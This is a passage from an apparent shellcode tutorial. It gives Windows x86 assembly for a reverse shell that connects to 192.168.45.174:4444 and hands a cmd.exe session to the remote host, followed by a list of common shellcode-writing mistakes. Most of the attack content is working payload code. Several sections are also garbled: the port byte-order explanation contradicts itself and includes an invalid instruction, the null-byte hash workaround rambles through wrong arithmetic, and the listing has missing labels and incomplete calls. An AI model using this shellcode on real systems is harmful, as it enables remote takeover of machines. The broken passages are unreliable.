push esp
push 0x00000202

call ebp

push eax               ; lpProtocolInfo = NULL
push 6                 ; IPPROTO_TCP
push 1                 ; SOCK_STREAM
push 2                 ; AF_INET

call ebp
mov  esi, eax          ; ESI = socket handle

; ---- Step 4: Build sockaddr_in for WSAConnect ----
; Target: 192.168.45.174:4444
; sin_addr DWORD to push: 0xAE2DA8C0  (= 192.168.45.174 in little-endian)
; sin_port + sin_family DWORD: 0x5C110002
xor  eax, eax

push eax               ; sin_zero[0..3]
push 0xAE2DA8C0        ; sin_addr = 192.168.45.174
push 0x5C110002        ; sin_port = htons(4444) + sin_family = AF_INET
mov  ebx, esp          ; EBX = &sockaddr_in

; ---- Step 5: WSAConnect(socket, &sockaddr_in, 16, NULL, NULL, NULL, NULL) ----
xor  eax, eax
push eax               ; lpGQOS = NULL
push eax               ; lpSQOS = NULL
push eax               ; lpCalleeData = NULL
push eax               ; lpCallerData = NULL
push 16                ; namelen = sizeof(sockaddr_in)
push ebx               ; name = &sockaddr_in

push 0x6174A599        ; WSAConnect

; ---- Steps 6-8: STARTUPINFO + cmd.exe + CreateProcessA ----
; Identical to bind shell Steps 8-11, but use ESI (not EDI) as the socket handle
; for hStdInput/Output/Error, since in a reverse shell there is no separate
; "accepted" socket — the same connected socket is used for I/O.

; Build STARTUPINFO
xor  eax, eax
mov  ecx, 0x11

push eax
loop zero_si_rev
mov  ebx, esp
mov  byte [ebx], 0x44  ; cb = 68
xor  edx, edx

mov  [ebx+64], esi     ; hStdError = connected socket

; "cmd\x00"
mov  edx, 0x646D6301
sub  dl, 1
push edx
mov  ecx, esp

sub  esp, 16
mov  edx, esp

; CreateProcessA
push edx
push ebx
xor  eax, eax
push eax               ; lpCurrentDirectory = NULL
push eax               ; lpEnvironment = NULL
push eax               ; dwCreationFlags = 0
push 1                 ; bInheritHandles = TRUE
push eax
push eax
push ecx               ; lpCommandLine = "cmd"
push eax               ; lpApplicationName = NULL
push 0x863FCC79        ; CreateProcessA

push 0x601D8708        ; WaitForSingleObject
```

## Common Mistakes and Pitfalls

### 1. Forgetting to call WSAStartup

Any WinSock function called before `WSAStartup` will fail with `WSANOTINITIALISED (0x276F = 10093)`. The error appears in `WSAGetLastError`, **not** in the function return value. This is one of the most common bugs when writing shellcode from scratch.

```c
// Wrong: calling WSASocketA directly
SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
// Returns INVALID_SOCKET; WSAGetLastError() = 10093

// Correct: WSAStartup first
WSAStartup(MAKEWORD(2,2), &wsadata);
SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
```

### 2. Wrong port byte order

Ports must be in **network byte order** (big-endian) in `sin_port`. On x86, when you push the DWORD containing `sin_family + sin_port`, you must account for little-endian storage:

```nasm
; WRONG: connecting to port 0x1157 when you want 4444 (0x115C)
push 0x5711 0002       ; typo/off-by-one in htons value

; WRONG: forgetting byte swap entirely
push 0x115C0002        ; pushes sin_port = 0x115C in memory AS-IS
                       ; but x86 stores it as 5C 11... wait, this is:
                       ; DWORD 0x115C0002 → bytes: 02 00 5C 11
                       ; sin_family = 0x0002 ✓, sin_port bytes = 5C 11
                       ; That is actually htons(4444)! (5C 11 = big-endian 0x115C)
                       ; BUT: the DWORD byte layout on the stack is little-endian:
                       ; mem[0]=0x02 mem[1]=0x00 mem[2]=0x5C mem[3]=0x11
                       ; sin_family = word at mem[0] = 0x0002 ✓
                       ; sin_port   = word at mem[2] = 0x115C in network order ✓
                       ; So 0x5C110002 gives port 4444 CORRECTLY.

; Verify with Python:
python3 -c "
import socket, struct
# What htons(4444) = ?
print(hex(socket.htons(4444)))  # 0x5c11 on little-endian (already swapped)
# DWORD to push for sin_family=2, sin_port=htons(4444):
dword = (socket.htons(4444) << 16) | 2   # high word = port, low word = family
# Wait — structs are packed, not bitshifted like this. Use struct.pack:
packed = struct.pack('<HH', 2, socket.htons(4444))
print(packed.hex())   # 0200 5c11 — as stored in memory
val = struct.unpack('<I', packed)[0]
print(hex(val))       # 0x115c0002 — the DWORD to push? No...
# push 0x5C110002:
packed2 = struct.pack('<I', 0x5C110002)
print(packed2.hex())  # 02 00 11 5c  → sin_family=0x0002, sin_port bytes=0x11,0x5c
# sin_port as big-endian WORD = 0x115c = 4444 ✓
"
```

The correct DWORD to push for `sin_family=AF_INET` + `sin_port=htons(4444)`:

```
0x5C110002
```

The in-memory bytes will be `02 00 11 5C` (little-endian), giving:
- `sin_family` = `0x0002` = `AF_INET` ✓
- `sin_port` bytes = `11 5C` = big-endian `0x115C` = decimal `4444` ✓

### 3. WSADATA buffer too small

`WSAStartup` writes up to 400 bytes into the `WSADATA` structure. If you allocate less than 400 bytes, `WSAStartup` will overflow into adjacent stack data, corrupting saved registers or return addresses.

```nasm
; WRONG: only 64 bytes allocated
sub  esp, 40           ; way too small — WSAStartup will corrupt the stack
push esp
push 0x0202
; call WSAStartup → stack corruption

; CORRECT: 400+ bytes (0x190 = 400; 0x200 = 512 is safer)
sub  esp, 0x200        ; 512 bytes — more than enough
push esp
push 0x0202
; call WSAStartup → safe
```

### 4. Checking INVALID_SOCKET incorrectly

`INVALID_SOCKET` is `0xFFFFFFFF` (all bits set), not `0`. A zero return from `WSASocketA` or `accept` does **not** indicate failure (though it is unusual):

```nasm
; WRONG: checking for NULL
call [ebp + WSASocketA_hash]
test eax, eax          ; sets ZF if EAX = 0
jz   error_handler     ; will NOT catch INVALID_SOCKET (0xFFFFFFFF)

; CORRECT: checking for INVALID_SOCKET
call [ebp + WSASocketA_hash]
inc  eax               ; if EAX was 0xFFFFFFFF (-1), it becomes 0
jz   error_handler     ; jump if INVALID_SOCKET
dec  eax               ; restore original value in EAX
; -- OR --
cmp  eax, 0xFFFFFFFF
je   error_handler
```

Most shellcode omits error checking entirely to save bytes, assuming the exploit environment is controlled.

### 5. Using the listening socket for cmd.exe I/O

In a **bind shell**, `accept` returns a **new** socket for the connected client. The original socket (from `WSASocketA`) remains the listening socket. You must use the **client socket** (from `accept`) as `hStdInput/Output/Error` in `STARTUPINFO`, not the listening socket.

```nasm
; WRONG: using the listening socket (ESI) for cmd.exe I/O
mov  [ebx+56], esi     ; hStdInput = listening socket — WRONG for bind shell

; CORRECT: use client socket (EDI) from accept()
call accept
mov  edi, eax          ; EDI = client socket
; ...
mov  [ebx+56], edi     ; hStdInput = client socket ✓
```

This mistake is especially easy to make when adapting a reverse shell to a bind shell.

### 6. bInheritHandles must be TRUE in CreateProcessA

For the child process (cmd.exe) to inherit the socket handle, `bInheritHandles` **must** be `TRUE (1)`. If it is `FALSE (0)`, the child process will have different handles for stdin/stdout/stderr, and shell output will not appear on the socket.

```nasm
; CreateProcessA argument stack (push right-to-left):
; ...
push 1                 ; bInheritHandles = TRUE  ← CRITICAL
; push 0 here = shell works locally but output never arrives on socket
```

### 7. LoadLibraryA hash collision with null bytes in hash

The hash `0x006B8029` for `WSAStartup` starts with a null byte when represented as a 4-byte value. If the shellcode calls the hash resolver with `push 0x006B8029`, the push is fine (it pushes the full DWORD), but if the hash is embedded in a string context (e.g., encoded payload), the leading `0x00` will terminate the string early. Store hashes in registers or use XOR decoding:

```nasm
; If shellcode must be null-byte-free:
mov  eax, 0xFF946FD7   ; XOR of 0x006B8029 with 0xFF6B8029 ... or compute as needed
xor  eax, 0xFF6B8029   ; might introduce nulls — check each hash individually
push eax               ; push the actual hash 0x006B8029
push 0x006B8029        ; ALTERNATIVE: just use this — the DWORD itself has no nulls
                       ; when pushed as a 4-byte immediate, the instruction bytes are:
                       ; 68 29 80 6B 00 — YES, has a 0x00 byte in the instruction!
; Solution: use a register + arithmetic:
xor  eax, eax
mov  al,  0x29
mov  ah,  0x80
bswap eax              ; eax = 0x00008029... still has nulls
; Or use: sub/add from a non-null value:
mov  eax, 0xFF6B8029 + 0x01000000  ; = 0x006B8029 + 0xFF000000... 
; Cleaner: XOR with FF at the high byte:
push 0xFF6B8029        ; no null bytes
pop  eax
sub  eax, 0xFF000000   ; EAX = 0x006B8029
push eax               ; push WSAStartup hash
```
